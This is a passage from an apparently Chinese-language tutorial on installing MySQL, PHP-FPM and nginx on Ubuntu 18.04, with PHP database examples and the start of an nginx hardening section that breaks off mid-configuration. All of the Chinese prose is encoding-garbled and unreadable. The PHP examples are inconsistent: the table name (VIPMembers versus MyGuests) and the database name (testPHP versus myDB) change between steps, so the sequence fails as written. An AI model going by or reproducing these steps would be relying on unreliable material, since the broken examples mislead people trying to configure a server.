<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install mysql-server</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼æµ‹è¯•MySQLæœåŠ¡å™¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mysql</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 2</span><br><span class="line">Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="Configure-MySQL-Security">Configure MySQL Security</h5>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒMySQLæœåŠ¡å™¨åªæœ‰ä¸€ä¸ªç”¨æˆ·ï¼š<code>root</code>ã€‚å¦‚æœæ‚¨æ˜¯Linuxç³»ç»Ÿä¸Šçš„rootç”¨æˆ·<em>å¹¶</em>æ‰§è¡Œ<code>mysql</code>å‘½ä»¤ï¼Œåˆ™åªèƒ½ä½¿ç”¨æ­¤ç”¨æˆ·ç™»å½•æ•°æ®åº“ï¼Œæ— éœ€è¾“å…¥å¯†ç ï¼Œä¹Ÿä¸éœ€è¦è¾“å…¥å¯†ç ã€‚</p>
<p>ä¸ºäº†ç¡®ä¿å®‰è£…ï¼ŒMySQLé™„å¸¦äº†ä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†è¯¢é—®æˆ‘ä»¬æ˜¯å¦è¦ä¿®æ”¹ä¸€äº›ä¸å®‰å…¨çš„é»˜è®¤å€¼ã€‚é”®å…¥ä»¥ä¸‹å‘½ä»¤å¯åŠ¨è„šæœ¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure>
<p>æ­¤è„šæœ¬å°†è¯¢é—®æ‚¨æ˜¯å¦è¦é…ç½®<code>VALIDATE PASSWORD PLUGIN</code>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ca0y1h@ubuntu18042:~$ sudo mysql_secure_installation</span><br><span class="line"></span><br><span class="line">Securing the MySQL server deployment.</span><br><span class="line"></span><br><span class="line">Connecting to MySQL using a blank password.</span><br><span class="line"></span><br><span class="line">VALIDATE PASSWORD PLUGIN can be used to <span class="built_in">test</span> passwords</span><br><span class="line">and improve security. It checks the strength of password</span><br><span class="line">and allows the users to <span class="built_in">set</span> only those passwords <span class="built_in">which</span> are</span><br><span class="line">secure enough. Would you like to setup VALIDATE PASSWORD plugin?</span><br><span class="line"></span><br><span class="line">Press y|Y <span class="keyword">for</span> Yes, any other key <span class="keyword">for</span> No:</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥<code>y</code>ï¼Œæ¥ä¸‹æ¥è„šæœ¬è¿˜ä¼šè¦æ±‚ä½ é€‰æ‹©å¯†ç éªŒè¯çº§åˆ«ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">There are three levels of password validation policy:</span><br><span class="line"></span><br><span class="line">LOW    Length &gt;= 8</span><br><span class="line">MEDIUM Length &gt;= 8, numeric, mixed <span class="keyword">case</span>, and special characters</span><br><span class="line">STRONG Length &gt;= 8, numeric, mixed <span class="keyword">case</span>, special characters and dictionary file</span><br><span class="line"></span><br><span class="line">Please enter 0 = LOW, 1 = MEDIUM and 2 = STRONG:</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥<code>1</code>é€‰æ‹©ä¸­ç­‰å¯†ç å¼ºåº¦ï¼Œæ¥ä¸‹æ¥ï¼Œç³»ç»Ÿä¼šè¦æ±‚æ‚¨æäº¤å¹¶ç¡®è®¤rootå¯†ç ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">New password: </span><br><span class="line"></span><br><span class="line">Re-enter new password: </span><br><span class="line"></span><br><span class="line">Estimated strength of the password: 100 </span><br><span class="line">Do you wish to <span class="built_in">continue</span> with the password provided?(Press y|Y <span class="keyword">for</span> Yes, any other key <span class="keyword">for</span> No) : y</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥MySQLè„šæœ¬å°†åˆ é™¤ä¸€äº›åŒ¿åç”¨æˆ·å’Œæµ‹è¯•æ•°æ®åº“ï¼Œç¦ç”¨è¿œç¨‹rootç™»å½•ï¼Œå¹¶åŠ è½½è¿™äº›æ–°è§„åˆ™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">By default, a MySQL installation has an anonymous user,</span><br><span class="line">allowing anyone to <span class="built_in">log</span> into MySQL without having to have</span><br><span class="line">a user account created <span class="keyword">for</span> them. This is intended only <span class="keyword">for</span></span><br><span class="line">testing, and to make the installation go a bit smoother.</span><br><span class="line">You should remove them before moving into a production</span><br><span class="line">environment.</span><br><span class="line"></span><br><span class="line">Remove anonymous users? (Press y|Y <span class="keyword">for</span> Yes, any other key <span class="keyword">for</span> No) : y</span><br><span class="line">Success.</span><br><span class="line"></span><br><span class="line">--snip--</span><br><span class="line"></span><br><span class="line">By default, MySQL comes with a database named <span class="string">&#x27;test&#x27;</span> that</span><br><span class="line">anyone can access. This is also intended only <span class="keyword">for</span> testing,</span><br><span class="line">and should be removed before moving into a production</span><br><span class="line">environment.</span><br><span class="line"></span><br><span class="line">--snip--</span><br><span class="line"></span><br><span class="line">Reloading the privilege tables will ensure that all changes</span><br><span class="line">made so far will take effect immediately.</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? (Press y|Y <span class="keyword">for</span> Yes, any other key <span class="keyword">for</span> No) : y</span><br><span class="line">Success.</span><br><span class="line"></span><br><span class="line">All <span class="keyword">done</span>! </span><br></pre></td></tr></table></figure>
<p>æœ€åéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿è¡ŒMySQL 5.7ï¼ˆåŠæ›´é«˜ç‰ˆæœ¬ï¼‰çš„Ubuntuç³»ç»Ÿä¸­ï¼Œå¦‚æœæ˜¯ä»¥rootèº«ä»½ç”¨æˆ·å¯åŠ¨<code>mysql</code>å‘½ä»¤æ—¶ï¼Œæ ¹MySQLç”¨æˆ·è®¾ç½®ä¸º<code>auth_socket</code>é»˜è®¤ä½¿ç”¨æ’ä»¶è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯ä½¿ç”¨å¯†ç è¿›è¡Œèº«ä»½éªŒè¯ã€‚å¦‚æœéœ€è¦å…è®¸å¤–éƒ¨ç¨‹åºï¼ˆä¾‹å¦‚phpMyAdminï¼‰è®¿é—®ç”¨æˆ·æ—¶ï¼Œä¼šå‡ºç°è®¿é—®å—é™çš„æƒ…å†µã€‚</p>
<p>è¿™æ ·å°±éœ€è¦å°†å…¶èº«ä»½éªŒè¯æ–¹æ³•ä»åˆ‡æ¢<code>auth_socket</code>ä¸º<code>mysql_native_password</code>ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥æ¯ä¸ªMySQLç”¨æˆ·å¸æˆ·ä½¿ç”¨çš„èº«ä»½éªŒè¯æ–¹æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT user,authentication_string,plugin,host FROM mysql.user;</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| user             | authentication_string                     | plugin                | host      |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| root             |                                           | auth_socket           | localhost |</span><br><span class="line">| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| debian-sys-maint | *A38295EEEA729FDFC0C36C8E270DDA27005B7693 | mysql_native_password | localhost |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œä»¥ä¸‹<code>ALTER USER</code>å‘½ä»¤ï¼Œæ›´æ”¹<code>password</code>ä¸ºä¸Šè¿°æ­¥éª¤é€‰æ‹©çš„å¼ºå¯†ç ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>ç„¶åï¼Œè¿è¡Œ<code>FLUSH PRIVILEGES</code>å‘Šè¯‰æœåŠ¡å™¨é‡æ–°åŠ è½½æˆæƒè¡¨å¹¶ä½¿æ–°çš„æ›´æ”¹ç”Ÿæ•ˆï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<p>é…ç½®æ ¹MySQLç”¨æˆ·ä½¿ç”¨å¯†ç è¿›è¡Œèº«ä»½éªŒè¯åï¼Œå°†æ— æ³•å†<code>sudo mysql</code>ä½¿ç”¨å…ˆå‰ä½¿ç”¨çš„å‘½ä»¤è®¿é—®MySQL ã€‚ç›¸åï¼Œå¿…é¡»è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥åˆšåˆšè®¾ç½®çš„å¯†ç åï¼Œå°†çœ‹åˆ°MySQLæç¤ºç¬¦ã€‚</p>
<p>æ­¤æ—¶ï¼Œæ•°æ®åº“ç³»ç»Ÿç°å·²è®¾ç½®å®Œæ¯•ï¼Œæ¥ä¸‹æ¥ç»§ç»­å®‰è£…PHPã€‚</p>
</li>
</ol>
<h3 id="å®‰è£…PHP-é…ç½®Nginx">å®‰è£…PHP&amp;é…ç½®Nginx</h3>
<ol>
<li>
<h5 id="Install-php-fpm">Install php-fpm</h5>
<p>ä¸Apacheä¸åŒï¼ŒNginxä¸åŒ…å«æœ¬åœ°PHPå¤„ç†ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¿…é¡»å®‰è£…PHP-FPMï¼ˆFastCGI Process Managerï¼‰ã€‚FPMæ˜¯å¦ä¸€ç§PHP FastCGIå®ç°ï¼Œå…·æœ‰ä¸€äº›å¯¹é‡è½½ç«™ç‚¹æœ‰ç”¨çš„é™„åŠ åŠŸèƒ½ã€‚å¦å¤–è¿˜éœ€è¦å®‰è£…php-mysqlä»¥å…è®¸PHPä¸MySQLæ•°æ®åº“é€šä¿¡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install php-fpm php-mysql</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹PHPæ˜¯å¦å®‰è£…æˆåŠŸï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ php --version</span><br><span class="line">PHP 7.2.19-0ubuntu0.18.04.1 (cli) (built: Jun  4 2019 14:48:12) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.2.19-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="Configure-Nginx-for-PHP">Configure Nginx for PHP</h5>
<p>ç°åœ¨å·²ç»å®‰è£…äº†æ‰€æœ‰å¿…éœ€çš„LEMPå †æ ˆç»„ä»¶ï¼Œä½†ä»éœ€è¦è¿›è¡Œä¸€äº›Nginxé…ç½®æ›´æ”¹ã€‚è¿™æ˜¯åœ¨æœåŠ¡å™¨å—çº§åˆ«å®Œæˆçš„ï¼ˆæœåŠ¡å™¨å—ç±»ä¼¼äºApacheçš„è™šæ‹Ÿä¸»æœºï¼‰ã€‚</p>
<p>åœ¨<code>/etc/nginx/sites-available/</code>ç›®å½•ä¸­æ‰“å¼€æ–°çš„æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ–°æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶å‘½å<code>example.com</code>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vim /etc/nginx/sites-available/example.com</span><br></pre></td></tr></table></figure>
<p>å°†ä»¥ä¸‹å†…å®¹ï¼ˆä»é»˜è®¤æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶ä¸­è·å–å¹¶ç•¥å¾®ä¿®æ”¹ï¼‰æ·»åŠ åˆ°æ–°æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶ä¸­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">        index index.php index.html index.htm index.nginx-debian.html;</span><br><span class="line">        server_name SERVER_IP_ADDRESS;</span><br><span class="line"></span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">                include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">                fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ &#x2F;\.ht &#123;</span><br><span class="line">                deny all;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>éœ€è¦æ³¨æ„ä¸¤ä¸ªåœ°æ–¹ï¼š</p>
<ul>
<li>åœ¨<code>index.html</code>å‰é¢æ·»åŠ <code>index.php</code></li>
<li>ç¡®ä¿<code>fastcgi_pass</code> å¥—æ¥å­—è·¯å¾„æ˜¯æ­£ç¡®çš„</li>
</ul>
<p>æ·»åŠ æ­¤å†…å®¹åï¼Œä¿å­˜å¹¶å…³é—­è¯¥æ–‡ä»¶ã€‚é€šè¿‡ä»æ–°æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶ï¼ˆåœ¨<code>/etc/nginx/sites-available/</code>ç›®å½•ä¸­ï¼‰åˆ°<code>/etc/nginx/sites-enabled/</code>ç›®å½•åˆ›å»ºç¬¦å·é“¾æ¥æ¥å¯ç”¨æ–°æœåŠ¡å™¨å—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/</span><br></pre></td></tr></table></figure>
<p>ç„¶åï¼Œä»<code>/sites-enabled/</code>ç›®å½•ä¸­å–æ¶ˆé“¾æ¥é»˜è®¤é…ç½®æ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo unlink /etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šå¦‚æœæ‚¨éœ€è¦æ¢å¤é»˜è®¤é…ç½®ï¼Œå¯ä»¥é€šè¿‡é‡æ–°åˆ›å»ºç¬¦å·é“¾æ¥æ¥æ‰§è¡Œæ­¤æ“ä½œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo ln -s /etc/nginx/sites-available/default /etc/nginx/sites-enabled/</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä»¥ä¸‹å‘½ä»¤å¯ä»¥æµ‹è¯•æ–°é…ç½®æ–‡ä»¶çš„è¯­æ³•é”™è¯¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nginx -t</span><br></pre></td></tr></table></figure>
<p>å‡†å¤‡å¥½åï¼Œé‡æ–°åŠ è½½Nginxçš„é…ç½®æ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl reload nginx</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="Create-a-PHP-file-to-Test-Configuration">Create a PHP file to Test Configuration</h5>
<p>åœ¨<code>/var/www/html/</code>ä¸‹æ–°å»º<code>info.php</code>æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vim /var/www/html/info.php</span><br></pre></td></tr></table></figure>
<p>åœ¨æ–°æ–‡ä»¶ä¸­å†™å…¥ä»¥ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure>
<p>ç°åœ¨å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è®¿é—®<code>http://Server_IP_Address/info.php/</code>ï¼Œåº”è¯¥çœ‹åˆ°PHPç”Ÿæˆçš„ç½‘é¡µï¼Œå…¶ä¸­åŒ…å«æœ‰å…³æ‚¨çš„æœåŠ¡å™¨çš„ä¿¡æ¯ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jbfupowxj20py0ekgmy.jpg" alt=""></p>
</li>
</ol>
<h3 id="éªŒè¯ç»“æœ">éªŒè¯ç»“æœ</h3>
<ol>
<li>
<h5 id="Connect-MySQL">Connect MySQL</h5>
<p>åœ¨<code>/var/www/html/</code>å»ºç«‹ä¸€ä¸ªæ–°æ–‡ä»¶<code>test_sql.php</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;username&quot;</span>;</span><br><span class="line">$password = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æ£€æµ‹è¿æ¥</span></span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿æ¥æˆåŠŸ&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jc5mudu3j20ev049weg.jpg" alt=""></p>
</li>
<li>
<h5 id="Create-Database">Create Database</h5>
<p>åœ¨ä¸Šä¸€ä¸ªæ­¥éª¤çš„åŸºç¡€ä¸Šï¼Œä¿®æ”¹<code>test_sql.php</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;username&quot;</span>;</span><br><span class="line">$password = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span><br><span class="line"><span class="comment">// æ£€æµ‹è¿æ¥</span></span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">// åˆ›å»ºæ•°æ®åº“</span></span><br><span class="line">$sql = <span class="string">&quot;CREATE DATABASE testPHP&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ•°æ®åº“åˆ›å»ºæˆåŠŸ&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . $conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$conn-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jc8g0seej20ff04k0sq.jpg" alt=""></p>
</li>
<li>
<h5 id="Create-Table">Create Table</h5>
<p>åœ¨ä¸Šä¸€ä¸ªæ­¥éª¤çš„åŸºç¡€ä¸Šï¼Œç»§ç»­ä¿®æ”¹<code>test_sql.php</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;testPHP&quot;</span>;</span><br><span class="line"> </span><br><span class="line">// åˆ›å»ºè¿æ¥</span><br><span class="line"><span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">// æ£€æµ‹è¿æ¥</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    die(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">// ä½¿ç”¨ sql åˆ›å»ºæ•°æ®è¡¨</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE VIPMembers (</span></span><br><span class="line"><span class="string">id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </span></span><br><span class="line"><span class="string">firstname VARCHAR(30) NOT NULL,</span></span><br><span class="line"><span class="string">lastname VARCHAR(30) NOT NULL,</span></span><br><span class="line"><span class="string">email VARCHAR(50),</span></span><br><span class="line"><span class="string">reg_date TIMESTAMP</span></span><br><span class="line"><span class="string">)&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>) === TRUE) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Table MyGuests created successfully&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;åˆ›å»ºæ•°æ®è¡¨é”™è¯¯: &quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jcuu2hgoj20h004m0sq.jpg" alt=""></p>
</li>
<li>
<h5 id="Insert-Record">Insert Record</h5>
<p>åœ¨ä¸Šä¸€ä¸ªæ­¥éª¤çš„åŸºç¡€ä¸Šï¼Œç»§ç»­ä¿®æ”¹<code>test_sql.php</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;myDB&quot;</span>;</span><br><span class="line"> </span><br><span class="line">// åˆ›å»ºè¿æ¥</span><br><span class="line"><span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">// æ£€æµ‹è¿æ¥</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    die(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO MyGuests (firstname, lastname, email)</span></span><br><span class="line"><span class="string">VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;)&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>) === TRUE) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5jcz3rcwcj20i304kweh.jpg" alt=""></p>
</li>
</ol>
<h2 id="æœåŠ¡å™¨åŠ å›º">æœåŠ¡å™¨åŠ å›º</h2>
<p>æœ¬ç« ä¸»è¦ç›®çš„æ˜¯ä»‹ç»å¦‚ä½•é€šè¿‡ä¼˜åŒ– Nginx é»˜è®¤é…ç½®ï¼Œæé«˜ Nginx Web æœåŠ¡å™¨çš„å®‰å…¨æ€§ã€‚å…¶ä¸­æ³¨é‡Šå¸¦æœ‰<code>ADD</code>æ˜¯ç›¸å¯¹äºé»˜è®¤é…ç½®çš„æ–°å¢é¡¹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line">include /etc/nginx/modules-enabled/*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">	worker_connections 768;</span><br><span class="line">	<span class="comment"># multi_accept on;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Basic Settings</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	sendfile on;</span><br><span class="line">	tcp_nopush on;</span><br><span class="line">	tcp_nodelay on;</span><br><span class="line">	keepalive_timeout 65;</span><br><span class="line">	types_hash_max_size 2048;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># éšè—Nginxç‰ˆæœ¬å·</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	server_tokens off;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># ADD: é€šè¿‡å…³é—­æ…¢è¿æ¥æ¥æŠµå¾¡ä¸€äº›DDOSæ”»å‡»</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">    <span class="comment"># è¯»å–å®¢æˆ·ç«¯è¯·æ±‚ä½“çš„è¶…æ—¶æ—¶é—´</span></span><br><span class="line">    client_body_timeout 5s; </span><br><span class="line">    <span class="comment"># è¯»å–å®¢æˆ·ç«¯è¯·æ±‚å¤´çš„è¶…æ—¶æ—¶é—´</span></span><br><span class="line">    client_header_timeout 5s;</span><br><span class="line">    <span class="comment"># è¶…æ—¶æ—¶é—´ä¹‹åä¼šå…³é—­è¿™ä¸ªè¿æ¥</span></span><br><span class="line">    keepalive_timeout 75s;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># ADD: </span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># å®¢æˆ·ç«¯è¯·æ±‚çš„httpå¤´éƒ¨ç¼“å†²åŒºå¤§å°</span></span><br><span class="line">    client_header_buffer_size 